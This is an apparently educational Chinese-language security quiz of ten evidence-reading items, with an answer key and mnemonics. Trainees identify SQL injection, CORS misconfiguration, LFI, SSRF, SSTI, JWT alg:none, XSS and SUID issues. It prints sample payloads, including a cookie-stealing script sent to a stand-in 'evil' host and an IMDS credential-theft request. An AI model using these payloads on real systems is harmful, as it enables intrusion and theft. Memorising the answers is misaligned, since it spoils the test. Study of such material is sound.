# 🔬 隊員 A 現場證據判讀卷（10 題）

> **換種考法**：題幹是**原始證據**（HTTP 請求 / log / 程式碼 / Smali / hex dump），你看證據反推漏洞類型。訓練「掃一眼 payload 就判型」的實戰取證能力。
> **用法**：限時 10 分鐘，每題先遮住選項、自己說出「這是什麼」再看選項驗證。答案已打散分布於 A～D。

---

#### A1. 看這段 HTTP 請求，判斷攻擊類型：
```http
GET /product?id=1%20AND%20(SELECT%201%20FROM%20(SELECT%20SLEEP(5))x) HTTP/1.1
Host: shop.example.com
```
* (A) UNION-based SQLi
* (B) SSRF
* (C) Time-based 盲注 SQLi
* (D) 路徑穿越

#### A2. 看這段伺服器回應標頭組合：
```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://evil-attacker.com
Access-Control-Allow-Credentials: true
```
* (A) 高危 CORS 錯配——伺服器反射任意 Origin 且允許攜帶憑證，任意站可帶 cookie 讀取回應
* (B) 正常的 CORS 設定
* (C) CSP 設定
* (D) HSTS 設定

#### A3. 看這段 PHP 原始碼，判斷漏洞：
```php
$file = $_GET['page'];
include("/var/www/pages/" . $file);
```
請求為 `?page=../../../../etc/passwd`
* (A) SQL 注入
* (B) XSS
* (C) 命令注入
* (D) 路徑穿越 / 本機檔案引入（LFI）

#### A4. 看這段應用日誌：
```
[WARN] outbound request to http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role
[INFO] fetched by image-proxy service on behalf of user param `url`
```
* (A) 正常的健康檢查
* (B) SSRF 打雲端 IMDS 竊取 IAM 臨時憑證
* (C) DNS 污染
* (D) 快取投毒

#### A5. 看這段 JWT 的標頭（Base64 解碼後）：
```json
{"alg":"none","typ":"JWT"}
```
* (A) `alg:none` —— 伺服器若接受則完全不驗簽，可任意偽造 token
* (B) 標準安全的 JWT
* (C) 使用 HS256 對稱簽章
* (D) 這是加密過的 JWE

#### A6. 看這段 Smali 片段：
```smali
const-string v0, "flag{r3v3rs3_m3}"
invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/String;)Z
move-result v1
if-eqz v1, :cond_fail
```
* (A) 一段網路連線邏輯
* (B) UI 版面配置
* (C) 硬編碼字串比對驗證——`flag{r3v3rs3_m3}` 即為正解 flag，比對相等才通過
* (D) 浮點數運算

#### A7. 看這段 HTTP 請求，判斷攻擊類型：
```http
POST /search HTTP/1.1
Content-Type: application/x-www-form-urlencoded

keyword={{config.items()}}
```
伺服器回應中出現了應用程式的設定物件內容。
* (A) XSS
* (B) SSTI（Jinja2 `{{ }}` 被伺服器端求值，洩漏 config 物件）
* (C) SQL 注入
* (D) CSRF

#### A8. 以 `xxd` 檢視一個副檔名為 `.png` 的檔案開頭：
```
00000000: 4d5a 9000 0300 0000 0400 0000 ffff 0000  MZ..............
```
* (A) 正常 PNG 檔
* (B) ZIP 壓縮檔
* (C) PDF 文件
* (D) `4D 5A`（`MZ`）是 Windows PE 執行檔的 Magic Bytes，副檔名被偽裝成圖片，實為可執行檔

#### A9. 看這段 HTML 片段（使用者暱稱欄位被存入後渲染給所有人）：
```html
<div class="nickname"><script>fetch('//evil/c?'+document.cookie)</script></div>
```
* (A) Stored XSS——持久化後對所有瀏覽者觸發，竊取 cookie 外送
* (B) Reflected XSS
* (C) DOM-based XSS
* (D) CSRF

#### A10. 看這段 `ls -l` 輸出，哪個檔案是本機提權的優先檢查目標？
```
-rwxr-xr-x 1 root root   48 find
-rwsr-xr-x 1 root root  120 backup
-rw-r--r-- 1 user user   30 notes.txt
drwxrwxrwt 1 root root    4 tmp
```
* (A) `find`（一般可執行檔）
* (B) `notes.txt`（純資料檔）
* (C) `backup`（具 SUID 位元 `rws`，執行時以 root 身分運行）
* (D) `tmp`（Sticky bit 目錄）

---
---

## ✅ 答案與解析

| A1 | A2 | A3 | A4 | A5 | A6 | A7 | A8 | A9 | A10 |
|:-:|:-:|:-:|:-:|:-:|:-:|:-:|:-:|:-:|:-:|
| **C** | **A** | **D** | **B** | **A** | **C** | **B** | **D** | **A** | **C** |

> 答案已打散（A×4、B×2、C×3、D×2），別靠位置猜——重點是你能不能**從證據說出理由**。

**A1 ─ C**：URL 解碼後是 `1 AND (SELECT 1 FROM (SELECT SLEEP(5))x)`，核心是 `SLEEP(5)` → **時間盲注**。沒有 UNION、沒有欄位回顯，故非 A。
**A2 ─ A**：**反射**了攻擊者 Origin（非 `*`）+ `credentials:true`，這是真正可利用的高危 CORS（比 `*` 更危險，因 `*` 不能帶憑證）。
**A3 ─ D**：使用者輸入直接拼進 `include()` 路徑 + `../` 跳目錄 → **路徑穿越/LFI**。
**A4 ─ B**：伺服器向 `169.254.169.254`（IMDS）發出外連、且來源是使用者可控的 `url` 參數 → **SSRF 竊 IAM 憑證**。
**A5 ─ A**：`alg:none` 代表無簽章；若後端未鎖演算法而接受，則可任意偽造。
**A6 ─ C**：`const-string` 載入 `flag{...}` + `equals` 比對 + `if-eqz` 跳轉 = 硬編碼驗證，字串本身就是答案。
**A7 ─ B**：`{{config.items()}}` 被伺服器端 Jinja2 求值並吐出 config → **SSTI**（非 XSS，因為是伺服器端執行、洩漏物件）。
**A8 ─ D**：`4D 5A`（`MZ`）是 PE 執行檔頭。副檔名 `.png` 造假，實為 Windows 可執行檔（惡意程式常用手法）。
**A9 ─ A**：暱稱**存入後渲染給所有人** + `<script>` 外送 cookie → **Stored XSS**（危害最廣）。
**A10 ─ C**：`backup` 權限 `-rwsr-xr-x` 的 `s` = **SUID**，執行時以擁有者 root 身分運行 → 提權優先目標。`tmp` 的 `t` 是 Sticky bit（非提權點）。

---

### 🧠 證據判讀口訣
- 看到 `SLEEP/WAITFOR/pg_sleep` → **時間盲注**；`UNION SELECT` → **聯合注入**；`updatexml` → **報錯注入**。
- 看到 `169.254.169.254` → **SSRF 打 IMDS**。
- 看到 `../` 拼路徑 → **穿越/LFI**；`include($_GET)` 引 http → **RFI**。
- 看到 `{{ }}`/`${ }` 被求值 → **SSTI**；`<script>` 原樣執行 → **XSS**。
- 看到 `alg:none` 或公鑰當 HMAC → **JWT 偽造**。
- Smali `const-string`+`equals`+`if-eqz` → **硬編碼驗證**。
- Magic Bytes：`MZ`=PE 執行檔、`89504E47`=PNG、`FFD8FF`=JPG、`504B0304`=ZIP、`25504446`=PDF。
- 權限位 `s`=SUID(提權)、`t`=Sticky(非提權)。
